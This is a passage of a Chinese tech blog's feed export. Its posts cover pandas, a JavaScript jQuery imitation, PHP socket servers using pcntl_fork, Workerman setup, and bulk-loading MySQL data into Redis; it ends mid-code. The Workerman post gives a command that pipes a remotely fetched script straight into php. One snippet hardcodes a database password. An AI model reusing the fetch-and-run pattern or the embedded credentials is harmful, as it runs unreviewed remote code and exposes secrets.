纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具。<br>最具有统计意味的工具包，某些方面优于R软件。数据结构有一维的Series，<br>二维的DataFrame(类似于Excel或者SQL中的表，如果深入学习，会发现Pandas和SQL相似的地方很多，例如merge函数)，三维的Panel（Pan（el) + da(ta) + s，知道名字的由来了吧）。学习Pandas你要掌握的是：</p><p>（1）汇总和计算描述统计，处理缺失数据 ，层次化索引</p><p>（2）清理、转换、合并、重塑、GroupBy技术</p><p>（3）日期和时间数据类型及工具（日期处理方便地飞起）</p><p>3.Matplotlib:</p><p>Python中最著名的绘图系统</p><p>需要掌握的是：<br>（1）散点图，折线图，条形图，直方图，饼状图，箱形图的绘制。<br>（2）绘图的三大系统：pyplot，pylab(不推荐)，面向对象<br>（3）坐标轴的调整，添加文字注释，区域填充，及特殊图形patches的使用</p><p>4.Scipy：<br>方便、易于使用、专为科学和工程设计的Python工具包.它包括统计,优化,整合,线性代数模块,傅里叶变换,信号和图像处理,常微分方程求解器</p><p>5.Scikit-learn</p><p>机器学习开源库</p><p>图书：</p><p>Pandas的创始者：利用Python进行数据分析 (豆瓣)（力荐）<br>教材的集合：Scipy Lecture Notes<br>提升自己：机器学习实战 </p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>js模拟实现JQueryDom操作</title>
      <link href="/2017/11/02/js%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0JQueryDom%E6%93%8D%E4%BD%9C/"/>
      <url>/2017/11/02/js%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0JQueryDom%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>最近一直在看《javascript高级程序设计第三版》，也在网上搜罗各种js的技术博客，现在想着模拟实现JQ的一些操作<br><a id="more"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">             var seven=<span class="keyword">function</span>(input_name)</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">return</span> seven.prototype.init(input_name);</span><br><span class="line">             &#125;</span><br><span class="line">              </span><br><span class="line">             seven.prototype=&#123;</span><br><span class="line">                init:<span class="keyword">function</span>(n)</span><br><span class="line">                &#123;</span><br><span class="line">                  this.id_object=null;//ID型的对象</span><br><span class="line">                  <span class="keyword">if</span>(n!=null &amp;&amp; typeof n==<span class="string">"object"</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                    this.id_object=n;</span><br><span class="line">                    <span class="built_in">return</span> this;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span>(n!=null &amp;&amp; typeof n==<span class="string">"string"</span> &amp;&amp; document.getElementById(n)!=null)  //初始化对象</span><br><span class="line">                  &#123;</span><br><span class="line">                     this.id_object=document.getElementById(n);</span><br><span class="line">                     <span class="built_in">return</span> this;</span><br><span class="line">                  &#125;</span><br><span class="line">                </span><br><span class="line">                  <span class="built_in">return</span> this;</span><br><span class="line">                &#125;,</span><br><span class="line">                //设置文字</span><br><span class="line">                html:<span class="keyword">function</span>(v)</span><br><span class="line">                &#123;</span><br><span class="line">                        //设置元素的innerHTML</span><br><span class="line">                        <span class="keyword">if</span>(this.isNull()) //没取到对象</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>(!v)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">return</span> null;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>(v) &#123;</span><br><span class="line">                                this.id_object.innerHTML=v;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">return</span> this.id_object.innerHTML;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">                &#125;,</span><br><span class="line">                //给元素设置属性</span><br><span class="line">                attr:<span class="keyword">function</span>(attrName,attrValue)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(this.isNull()) //没取到对象</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">return</span> null;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> </span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(attrName &amp;&amp; attrValue)</span><br><span class="line">                        &#123;</span><br><span class="line">                            //设置元素的属性</span><br><span class="line">                            <span class="keyword">if</span>(this.id_object.getAttribute(attrName)!=null) &#123;</span><br><span class="line">                                    this.id_object.setAttribute(attrName,attrValue)</span><br><span class="line">                             &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(attrName)</span><br><span class="line">                        &#123;</span><br><span class="line">                            //返回元素的属性</span><br><span class="line">                            <span class="built_in">return</span> this.id_object.getAttribute(attrName);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">return</span> null;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                isNull:<span class="keyword">function</span>()//判断对象是否存在</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(this.id_object==null)</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;,</span><br><span class="line">                //判断页面加完元素资源完成</span><br><span class="line">                ready:<span class="keyword">function</span>(fn)</span><br><span class="line">                &#123;</span><br><span class="line">                    document.onreadystatechange=<span class="keyword">function</span>()</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(document.readyState!=<span class="string">"loading"</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            fn();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                //获取元素的父元素</span><br><span class="line">                parent:<span class="keyword">function</span>()</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(this.isNull()) <span class="built_in">return</span> seven();</span><br><span class="line">                    <span class="built_in">return</span> seven(this.id_object.parentNode);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">             &#125;;</span><br><span class="line">             seven().ready(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">                 </span><br><span class="line">                 console.log(seven(<span class="string">"seven"</span>).parent().parent().parent().attr(<span class="string">"name"</span>))</span><br><span class="line">             &#125;)</span><br><span class="line"></span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;div name=<span class="string">"parent"</span>&gt;</span><br><span class="line">          &lt;div name=<span class="string">"father"</span>&gt;</span><br><span class="line">             &lt;div id=<span class="string">"seven"</span>  &gt;</span><br><span class="line">                hello world!</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">         &lt;/div&gt;</span><br><span class="line">         </span><br><span class="line">         &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>只是单纯模拟，实际JQ源码复杂的多，但是原理差不多。</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>workman学习系列1</title>
      <link href="/2017/11/01/workman%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%971/"/>
      <url>/2017/11/01/workman%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%971/</url>
      
        <content type="html"><![CDATA[<p>在之前的学习当中，感觉php就是做各种网站，其实php可以利用各种第三方来完成各种各样的小功能，比如，现在我接下来要学习的workman<br><a id="more"></a></p><blockquote><p>Workerman不是重复造轮子，它不是一个MVC框架，而是一个更底层更通用的socket服务框架，你可以用它开发tcp代理、梯子代理、做游戏服务器、邮件服务器、ftp服务器、甚至开发一个php版本的Redis、php版本的数据库、php版本的nginx、php版本的php-fpm等等。Workerman可以说是PHP领域的一次创新，让开发者彻底摆脱了PHP只能做WEB的束缚。</p></blockquote><h2 id="安装下载wokerman"><a href="#安装下载wokerman" class="headerlink" title="安装下载wokerman"></a>安装下载wokerman</h2><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><pre><code>workerman对php环境的要求是：1、PHP CLI&gt;=5.4，可以运行命令 php -v 查看版本2、Linux系统要求php安装了posix和pcntl扩展Linux系统可以在命令中运行 curl -Ss http://www.workerman.net/check.php | php 检测本地环境是否满足workerman。</code></pre><p>环境配置成功<br><img src="环境检查.png" alt=""></p><h2 id="下载源码测试连接"><a href="#下载源码测试连接" class="headerlink" title="下载源码测试连接"></a>下载源码测试连接</h2><p>具体教程请看<a href="http://doc.workerman.net/315113" target="_blank" rel="noopener">workerman</a></p><p>测试成功<br><img src="workerman.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php+socket多进程处理请求原理</title>
      <link href="/2017/11/01/php-socket%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/11/01/php-socket%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>由于多进程在windows不支持，我们在ubuntu中进行开发<br><a id="more"></a></p><h2 id="安装pcntl扩展"><a href="#安装pcntl扩展" class="headerlink" title="安装pcntl扩展"></a>安装pcntl扩展</h2><p>进程PHP源码文件。进入ext/pcntl<br>2)、执行phpize<br>3)、执行 ./configure –prefix=/usr/local/php –with-php-config=/usr/local/php/bin/php-config (这里的路径请根据自己的php安装路径进行修改)<br>4)、make然后make install<br>5)、打开你的PHP配置文件(php –ini)，加入 extension=pcntl.so</p><p>安装成功:<br><img src="pctnl.png" alt=""></p><h1 id="单进程处理遇到的问题"><a href="#单进程处理遇到的问题" class="headerlink" title="单进程处理遇到的问题"></a>单进程处理遇到的问题</h1><p>模拟请求卡顿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php</span><br><span class="line">    <span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);</span><br><span class="line">    socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,9090) or die(<span class="string">'error'</span>);</span><br><span class="line">    socket_listen(<span class="variable">$socket</span>,5);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable">$client</span> = socket_accept(<span class="variable">$socket</span>);   </span><br><span class="line">        <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,1024);   </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/sleep/i'</span>,<span class="variable">$buf</span>))&#123;</span><br><span class="line">            //匹配到sleep，模拟服务器繁忙</span><br><span class="line">            sleep(10);</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$html</span> = <span class="string">'HTTP/1.1 200 OK'</span>.PHP_EOL</span><br><span class="line">                .<span class="string">'Content-Type: text/html;charset=utf-8'</span>.PHP_EOL.PHP_EOL;</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="variable">$html</span>);</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="string">'休克了10秒,模拟很繁忙的样子'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="string">'get the resources'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        socket_close(<span class="variable">$client</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    socket_close(<span class="variable">$socket</span>);</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">如果这个时候，有其他请求，则其他请求也会受干扰，访问不了</span><br><span class="line">如下所示：</span><br><span class="line">![](卡顿.png)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多进程处理</span></span><br><span class="line"></span><br><span class="line">使用php多进程处理函数pcntl_fork</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">        <span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);</span><br><span class="line">        socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,9090) or die(<span class="string">'error'</span>);</span><br><span class="line">        socket_listen(<span class="variable">$socket</span>,5);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="variable">$client</span> = socket_accept(<span class="variable">$socket</span>);</span><br><span class="line">        </span><br><span class="line">            //创建紫金城</span><br><span class="line">            <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line">            //父进程和子进程都会执行下面代码</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">                //错误处理：创建子进程失败时返回-1.</span><br><span class="line">                die(<span class="string">'could not fork'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                //父进程会得到子进程号，所以这里是父进程执行的逻辑</span><br><span class="line">                //pcntl_wait(<span class="variable">$status</span>); //等待子进程中断，防止子进程成为僵尸进程。</span><br><span class="line">                socket_close(<span class="variable">$client</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                //子进程得到的<span class="variable">$pid</span>为0, 所以这里是子进程执行的逻辑。</span><br><span class="line">                <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,1024);</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">'/sleep/i'</span>,<span class="variable">$buf</span>))&#123;</span><br><span class="line">                    sleep(10);</span><br><span class="line">                    <span class="variable">$html</span> = <span class="string">'HTTP/1.1 200 OK'</span>.PHP_EOL</span><br><span class="line">                        .<span class="string">'Content-Type: text/html;charset=utf-8'</span>.PHP_EOL.PHP_EOL;</span><br><span class="line">                    socket_write(<span class="variable">$client</span>,<span class="variable">$html</span>);</span><br><span class="line">                    socket_write(<span class="variable">$client</span>,<span class="string">'get the resources but,sleep 10 sec,it is busy!'</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    socket_write(<span class="variable">$client</span>,<span class="string">'get the resources'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                socket_close(<span class="variable">$client</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        socket_close(<span class="variable">$socket</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> socket,多进程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql数据批量灌入到Redis</title>
      <link href="/2017/10/31/mysql%E6%95%B0%E6%8D%AE%E6%89%B9%E9%87%8F%E7%81%8C%E5%85%A5%E5%88%B0redis/"/>
      <url>/2017/10/31/mysql%E6%95%B0%E6%8D%AE%E6%89%B9%E9%87%8F%E7%81%8C%E5%85%A5%E5%88%B0redis/</url>
      
        <content type="html"><![CDATA[<p>日常操作，我们需要将mysql数据插入到Redis进行使用，最简单的方式是直接循环数据库数据，依次插入到Redis,但是查阅了官网上文档，循环遍历数据表依次执行插入到Redis的一个指令，这并不是一个很好的主意，因为会很慢，并且消耗大量的服务器资源，官网原文是这样<br><a id="more"></a></p><blockquote><p>Only a small percentage of clients support non-blocking I/O, and not all the clients are able to parse the replies in an efficient way in order to maximize throughput. For all this reasons the preferred way to mass import data into Redis is to generate a text file containing the Redis protocol, in raw format, in order to call the commands needed to insert the required data.</p></blockquote><p>正确的做法是官网给出了一个做法是：生成一个Redis指令规则文件，然后再在Redis-cli执行这个指令文件。</p><p>规则如下：</p><pre><code>*&lt;args&gt;&lt;cr&gt;&lt;lf&gt;$&lt;len&gt;&lt;cr&gt;&lt;lf&gt;&lt;arg0&gt;&lt;cr&gt;&lt;lf&gt;&lt;arg1&gt;&lt;cr&gt;&lt;lf&gt;...&lt;argN&gt;&lt;cr&gt;&lt;lf&gt;Where &lt;cr&gt; means &quot;\r&quot; (or ASCII character 13) and &lt;lf&gt; means &quot;\n&quot; (or ASCII character 10).</code></pre><p>也就是</p><pre><code>*&lt;args&gt;\r\n 表示指令的个数，比如set key value 就有3个$&lt;len&gt;\r\n 表示下面指令的字符长度比如set 就3&lt;arg0&gt;\r\n$&lt;len&gt;\r\n 同上&lt;arg1&gt;\r\n...&lt;argN&gt;\r\n</code></pre><p>举个栗子：</p><p>SET key value</p><pre><code>*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n</code></pre><h2 id="实例：将mysql中的用户数据批量插入到Redis中"><a href="#实例：将mysql中的用户数据批量插入到Redis中" class="headerlink" title="实例：将mysql中的用户数据批量插入到Redis中"></a>实例：将mysql中的用户数据批量插入到Redis中</h2><h3 id="利用mysql把内容输出"><a href="#利用mysql把内容输出" class="headerlink" title="利用mysql把内容输出"></a>利用mysql把内容输出</h3><ul><li>mysql -uroot -p -D databasename -e “数据库语句”</li><li>mysql -uroot -p -D databasename –skip-column-names -raw &lt;sql语句文件路径名字</li></ul><p>–skip-column-names表示不显示列名<br>–raw原生输出，不做任何转义</p><h3 id="查询数据数据并拼接成符合Redis格式"><a href="#查询数据数据并拼接成符合Redis格式" class="headerlink" title="查询数据数据并拼接成符合Redis格式"></a>查询数据数据并拼接成符合Redis格式</h3><pre><code>SELECT concat(&apos;*4&apos;,&apos;\r\n&apos;,&apos;$4&apos;,&apos;\r\n&apos;,&apos;hset&apos;,&apos;\r\n&apos;,&apos;$8&apos;,&apos;\r\n&apos;,&apos;user_sys&apos;,&apos;\r\n&apos;,&apos;$&apos;,LENGTH(user_name),&apos;\r\n&apos;,user_name,&apos;\r\n&apos;,&apos;$&apos;,LENGTH(user_pwd),&apos;\r\n&apos;,user_pwd,&apos;\r&apos;) FROM user_sys    </code></pre><p>如图所示：生成符合Redis规则的格式</p><p><img src="mysql数据批量灌入到redis\Redis规则.png" alt=""></p><p>语句保存为user_sys.sql</p><h3 id="在Redis-cli执行pipe批量插入指令"><a href="#在Redis-cli执行pipe批量插入指令" class="headerlink" title="在Redis-cli执行pipe批量插入指令"></a>在Redis-cli执行pipe批量插入指令</h3><ul><li>mysql -uroot -p -D ceshi –skip-column-names –raw &lt;user_sys.sql | Redis-cli –pipe</li></ul><p>这个用户表有100万条数句，也是我们之前学习存储过程灌入的</p><p>效果如下:<br><img src="mysql数据批量灌入到redis\Redis-insert.png" alt=""><br>几秒钟就执行完毕了，感兴趣的可以使用php循环查询数据插入到Redis中，对比插入速度，高下立判</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>利用pandas读取apache日志，分析访问最多的api，统计访问量最高的时段</title>
      <link href="/2017/10/30/%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96apache%E6%97%A5%E5%BF%97%EF%BC%8C%E5%88%86%E6%9E%90%E8%AE%BF%E9%97%AE%E6%9C%80%E5%A4%9A%E7%9A%84api%EF%BC%8C%E7%BB%9F%E8%AE%A1%E8%AE%BF%E9%97%AE%E9%87%8F%E6%9C%80%E9%AB%98%E7%9A%84%E6%97%B6%E6%AE%B5/"/>
      <url>/2017/10/30/%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96apache%E6%97%A5%E5%BF%97%EF%BC%8C%E5%88%86%E6%9E%90%E8%AE%BF%E9%97%AE%E6%9C%80%E5%A4%9A%E7%9A%84api%EF%BC%8C%E7%BB%9F%E8%AE%A1%E8%AE%BF%E9%97%AE%E9%87%8F%E6%9C%80%E9%AB%98%E7%9A%84%E6%97%B6%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p>利用pandas读取apache日志，分析访问最多的api，统计访问量最高的时段<br><a id="more"></a></p><ul><li><p>统计访问最多的path(api路径)</p><pre><code>import numpy as npimport pandas as pdimport jsonif __name__==&apos;__main__&apos;:    #过滤时间以及不是json对象的字符串    def isJsonlike(str):        try:            json.loads(str)            return True        except:            return False    with open(&apos;./httpd.log&apos;,encoding=&apos;utf-8&apos;) as file:        loglist = [json.loads(str) for str in file if isJsonlike(str)]        file.close()    log = pd.DataFrame(loglist)    print(log.groupby(&apos;path&apos;).size().sort_values(ascending=False))</code></pre></li></ul><p><img src="appache_path.png" alt=""></p><ul><li>计算出访问量最高的时间段（以小时为例子）</li></ul><pre><code class="bash">import numpy as npimport pandas as pdfrom sqlalchemy import create_enginefrom common.config import dburlimport json<span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:    <span class="comment">#过滤时间以及不是json对象的字符串</span>    def isJsonlike(str):        try:            json.loads(str)            <span class="built_in">return</span> True        except:            <span class="built_in">return</span> False    with open(<span class="string">'./httpd.log'</span>,encoding=<span class="string">'utf-8'</span>) as file:        loglist = [json.loads(str) <span class="keyword">for</span> str <span class="keyword">in</span> file <span class="keyword">if</span> isJsonlike(str)]        file.close()    <span class="built_in">log</span> = pd.DataFrame(loglist)    <span class="comment">#构建时间段</span>    datelist = pd.date_range(<span class="string">'2017-10-10 00:00:00'</span>, end=<span class="string">'2017-10-11 00:00:00'</span>, closed=<span class="string">'left'</span>,freq=<span class="string">'h'</span>)    <span class="comment">#转换为时间格式</span>    <span class="built_in">log</span>[<span class="string">'dt'</span>] = pd.to_datetime(<span class="built_in">log</span>[<span class="string">'dt'</span>])    <span class="built_in">log</span>[<span class="string">'dr'</span>] = pd.cut(<span class="built_in">log</span>[<span class="string">'dt'</span>],bins=datelist,right=False)    <span class="built_in">print</span>(log.groupby(<span class="string">'dr'</span>).size().sort_values(ascending=False))</code></pre><p><img src="请求量.png" alt=""><br>上述代码不懂的可以查询手册查询其用法</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>利用pandas统计商城用户消费情况</title>
      <link href="/2017/10/30/%E5%88%A9%E7%94%A8panda%E7%BB%9F%E8%AE%A1%E5%95%86%E5%9F%8E%E7%94%A8%E6%88%B7%E6%B6%88%E8%B4%B9%E6%83%85%E5%86%B5/"/>
      <url>/2017/10/30/%E5%88%A9%E7%94%A8panda%E7%BB%9F%E8%AE%A1%E5%95%86%E5%9F%8E%E7%94%A8%E6%88%B7%E6%B6%88%E8%B4%B9%E6%83%85%E5%86%B5/</url>
      
        <content type="html"><![CDATA[<p>利用pandas统计商城用户消费情况<br><a id="more"></a></p><p>需求可以简单列举如下：<br>把每个用户一段时间内的消费情况根据订单表保存到积分表中</p><ul><li>双11快到了，需要统计11月份用户的消费情况，赠送积分</li><li>根据用户的消费数据，更新用户等级</li></ul><p><img src="panda统计用户消费情况.png" alt=""></p><ul><li>根据用户的消费数据，更新用户等级<br>实现如下:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">from sqlalchemy import create_engine</span><br><span class="line">from common.config import dburl</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    engine = create_engine(<span class="string">"mysql+pymysql://root:12312312@localhost/5kcrm?charset=utf8"</span>)</span><br><span class="line">    res = engine.execute(<span class="string">"select user_id,real_amount,pay_time from 5kcrm_order where pay_status=1"</span>).fetchall()</span><br><span class="line">    orders = pd.DataFrame(res,columns=[<span class="string">'user_id'</span>,<span class="string">'real_amount'</span>,<span class="string">'pay_time'</span>])</span><br><span class="line">    <span class="comment"># result = orders.groupby(["user_id",orders.apply(lambda x:x['pay_time'].strftime('%Y-%m'),axis=1)]).agg(&#123;'real_amount':np.sum&#125;)</span></span><br><span class="line">    result = orders.groupby([<span class="string">"user_id"</span>]).agg(&#123;<span class="string">'real_amount'</span>:np.sum&#125;)</span><br><span class="line">    levels = [<span class="string">"青铜"</span>,<span class="string">"白银"</span>,<span class="string">"黄金"</span>,<span class="string">'白金'</span>,<span class="string">'王者'</span>]</span><br><span class="line">    rank = 